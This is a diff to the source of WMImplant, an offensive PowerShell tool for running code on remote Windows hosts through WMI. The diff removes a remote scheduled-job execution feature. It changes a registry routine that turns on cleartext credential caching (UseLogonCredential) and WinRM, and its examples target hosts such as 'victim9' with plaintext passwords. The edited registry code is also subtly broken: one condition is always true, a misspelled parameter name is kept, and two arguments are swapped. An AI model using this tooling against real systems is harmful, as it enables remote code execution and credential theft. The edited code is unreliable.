@@ -1067,55 +1067,6 @@ function Invoke-CommandGeneration
             $Command
         }
 
-        "sched_job"
-        {
-            $GenJobAction = Read-Host "Do you want your job to [list], [create], or [delete] a scheduled job?"
-            $GenJobAction = $GenJobAction.Trim().ToLower()
-
-            switch($GenJobAction)
-            {
-                "list"
-                {
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ListJobs -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ListJobs -Target $GenTarget`n"
-                    }
-                }
-
-                "delete"
-                {
-                    $GenJobID = Read-Host "What is the ID of the job you want to delete? >"
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -DeleteJob -RemoteID $GenJobID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -DeleteJob -RemoteID $GenJobID -Target $GenTarget`n"
-                    }
-                }
-
-                "create"
-                {
-                    $GenJobName = Read-Host "What's the full path to the file you'd like to execute? >"
-                    $GenJobTime = Read-Host "What time do you want the job to execute? EX: 14:04 >"
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -CreateJob -RemoteFile $GenJobName -Time $GenJobTime -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -CreateJob -RemoteFile $GenJobName -Time $GenJobTime -Target $GenTarget`n"
-                    }
-                }
-            }
-            $Command
-        }
-
         "service_mod"
         {
             $GenServiceAction = Read-Host "Do you want to [start], [stop], [create], or [delete] a service? >"
@@ -1415,118 +1366,6 @@ function Invoke-CommandGeneration
     } #End of switch
 } #End of Function
 
-function Invoke-JobMod
-{
-    # This function allows users to list, delete, or create scheduled jobs on the targeted system
-    param
-    (
-        #Parameter assignment
-        [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
-        [Parameter(Mandatory = $False)] 
-        [string]$Target,
-        [Parameter(Mandatory = $False)]
-        [switch]$CreateJob,
-        [Parameter(Mandatory = $False)]
-        [switch]$ListJobs,
-        [Parameter(Mandatory = $False)]
-        [switch]$DeleteJob,
-        [Parameter(Mandatory = $False)]
-        [string]$JobId,
-        [Parameter(Mandatory = $False)]
-        [string]$JobProcess,
-        [Parameter(Mandatory = $False)]
-        [string]$Time
-    )
-
-    Process
-    {
-
-        if(!$Target)
-        {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
-        }
-
-        if($ListJobs)
-        {
-            if($Creds)
-            {
-                $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds
-            }
-            else
-            {
-                $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target
-            }
-
-            foreach($job in $jobs)
-            {
-                if($job -ne $null)
-                {
-                    $job
-                    Write-Output "Start Time: " $job.StartTime
-                }
-                else
-                {
-                    Write-Output "No jobs currently scheduled"
-                }
-            }
-        }
-
-        elseif($DeleteJob)
-        {
-            if(!$JobId)
-            {
-                $JobId = Read-Host "What is the job ID of the job you'd like to delete? >"
-                $JobId = $JobId.Trim()
-            }
-
-            Write-Verbose "Deleting job $JobId"
-
-            if($Creds)
-            {
-                $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds -Filter "jobID = $JobId"
-            }
-            else
-            {
-                $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Filter "jobID = $JobId"
-            }
-
-            $job.delete()
-            Write-Verbose "Job $JobId has been removed"                
-        }
-
-        elseif($CreateJob)
-        {
-            if(!$JobProcess)
-            {
-                $JobProcess = Read-Host "What is the full path to the file you'd like to start with a job? >"
-                $JobProcess = $JobProcess.Trim()
-            }
-
-            if(!$Time)
-            {
-                $Time = Read-Host "What time do you want this to execute? (Ex: 14:04) >"
-                $Time = $Time.Trim()
-            }
-
-            Write-Verbose "Creating job on remote system"
-            $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
-            $Time = $wmi_sched_job.ConvertFromDateTime($Time)
-
-            if($Creds)
-            {
-                (Get-WmiObject -list win32_scheduledjob -ComputerName $Target -Credential $Creds).Create($JobProcess,$Time)
-            }
-            else
-            {
-                (Get-WmiObject -list win32_scheduledjob -ComputerName $Target).Create($JobProcess,$Time)
-            }
-        }
-    }
-    end{}
-}
-
 function Invoke-ProcessPunisher
 {
     # This function kills a process on the targeted system via name or PID
@@ -1798,6 +1637,21 @@ function Invoke-RegValueMod
             $RegSubKey = Read-Host "What's the registry Sub Key you'd like to modify? Ex: WMImplantInstalled >"
         }
 
+        if ((!$KeyCreate) -or (!$KeyDelete))
+        {
+            $question = Read-Host "Do you want to [create] or [delete] a key? >"
+            $question = $question.Trim().ToLower()
+
+            if($question.ToLower() -eq "create")
+            {
+                $KeyCreate = $True
+            }
+            else
+            {
+                $KeyDelete = $True
+            }
+        }
+
         if($KeyCreate)
         {
             if(!$RegValue)
@@ -1807,25 +1661,25 @@ function Invoke-RegValueMod
 
             if($Creds)
             {
-                if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig") 
+                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig") 
                 {
                     Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target -Credential $Creds
                 }
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegSubKey, $RegValue -ComputerName $Target -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target -Credential $Creds
                 }
             }
 
             else
             {
-                if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig")
+                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig")
                 {
                     Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target
                 }
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegSubKey, $RegValue -ComputerName $Target
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target
                 }
             }
         }
@@ -2225,18 +2079,6 @@ function Invoke-WMImplant
     .EXAMPLE
     > Invoke-WMImplant -Command poweroff -Target victim9 -RemoteUser domain\user -RemotePass pass123
     This command powers off the "victim9" and authenticates as the provided user and password.
-
-    .EXAMPLE
-    > Invoke-WMImplant -Command sched_job -ListJobs -Target winsys2
-    This command authenticates to the winsys2 system under the current user's context and list all scheduled jobs.
-
-    .EXAMPLE
-    > Invoke-WMImplant -Command sched_job -DeleteJob -RemoteID 15 -Target winsys3 -RemoteUser sys\tester -RemotePass chrispass
-    This command authenticates to the winsys3 application with the tester account and deletes the schedule job with the job id of 15.
-
-    .EXAMPLE
-    > Invoke-WMImplant -Command sched_job -CreateJob -RemoteFile notepad.exe -Time 14:45 -Target theboss
-    This command authenticates to "theboss" system under the current user's context, and creates a job that runs notepad.exe at 14:45.
     
     .EXAMPLE
     > Invoke-WMImplant -Command registry_mod -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
@@ -2260,8 +2102,6 @@ function Invoke-WMImplant
         [string]$RemoteUser,
         [Parameter(Mandatory = $False)]
         [string]$RemotePass,
-        [Parameter(Mandatory = $False, ParameterSetName='Delete Job')]
-        [string]$RemoteID,
         [Parameter(Mandatory = $False, ParameterSetName='Download File')]
         [Parameter(ParameterSetName='Upload File')]
         [Parameter(ParameterSetName='Logon Events')]
@@ -2271,14 +2111,7 @@ function Invoke-WMImplant
         [Parameter(ParameterSetName='Download File')]
         [Parameter(ParameterSetName='File Search Name')]
         [Parameter(ParameterSetName='Process Start')]
-        [Parameter(ParameterSetName='Job Create')]
         [string]$RemoteFile,
-        [Parameter(Mandatory = $False, ParameterSetName='List Jobs')]
-        [switch]$ListJobs,
-        [Parameter(Mandatory = $False, ParameterSetName='Job Create')]
-        [switch]$CreateJob,
-        [Parameter(Mandatory = $False, ParameterSetName='Delete Job')]
-        [switch]$DeleteJob,
         [Parameter(ParameterSetName='Directory Listing')]
         [string]$RemoteDirectory,
         [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
@@ -2307,8 +2140,6 @@ function Invoke-WMImplant
         [switch]$ServiceCreate,
         [Parameter(Mandatory = $False, ParameterSetName='Service Delete')]
         [switch]$ServiceDelete,
-        [Parameter(Mandatory = $False, ParameterSetName='Create Scheduled Job')]
-        [string]$Time,
         [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
         [Parameter(ParameterSetName='Delete Reg Key')]
         [string]$RegKey,
@@ -2755,81 +2586,6 @@ function Invoke-WMImplant
                 else
                 {
                     Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -Target $Computer
-                }
-            }
-        }
-
-        elseif($ListJobs)
-        {
-            if(!$Target)
-            {
-                Throw "You need to specify a target to run the command against!"
-            }
-
-            Foreach($Computer in $Target)
-            {
-                if($RemoteCredential)
-                {
-                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -ListJobs
-                }
-                else
-                {
-                    Invoke-JobMod -Target $Computer -ListJobs
-                }
-            }
-        }
-
-        elseif($DeleteJob)
-        {
-            if(!$Target)
-            {
-                Throw "You need to specify a target to run the command against!"
-            }
-
-            if(!$RemoteID)
-            {
-                Throw "You need to specify the job ID to delete with the -RemoteID flag"
-            }
-
-            Foreach($Computer in $Target)
-            {
-                if($RemoteCredential)
-                {
-                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -DeleteJob
-                }
-                else
-                {
-                    Invoke-JobMod -Target $Computer -DeleteJob
-                }
-            }
-        }
-
-        elseif($CreateJob)
-        {
-            if(!$Target)
-            {
-                Throw "You need to specify a target to run the command against!"
-            }
-
-            if(!$RemoteFile)
-            {
-                Throw "You need to specify the path to a file to run when creating a job with -RemoteFile flag"
-            }
-
-            if(!$Time)
-            {
-                Throw "You need to use -Time to specify when your job will run"
-            }
-
-            Foreach($Computer in $Target)
-            {
-                if($RemoteCredential)
-                {
-                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -CreateJob -JobProcess $RemoteFile -Time $Time
-                }
-                else
-                {
-                    Invoke-JobMod -Target $Computer -CreateJob -JobProcess $RemoteFile -Time $Time
                 }
             }
         }
@@ -3339,7 +3095,6 @@ function Show-WMImplantMainMenu
     $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
     $menu_options += "registry_mod - Modify the registry on the targeted system`n"
     $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
-    $menu_options += "sched_job - Manipulate scheduled jobs`n"
     $menu_options += "service_mod - Create, delete, or modify services`n`n"
 
     $menu_options += "Process Operations`n"
@@ -3573,18 +3328,6 @@ function Use-MenuSelection
                 else
                 {
                     Invoke-RemoteScriptWithOutput
-                }
-            }
-
-            "sched_job"
-            {
-                if($Credential)
-                {
-                    Invoke-JobMod -Creds $Credential
-                }
-                else
-                {
-                    Invoke-JobMod
                 }
             }
 
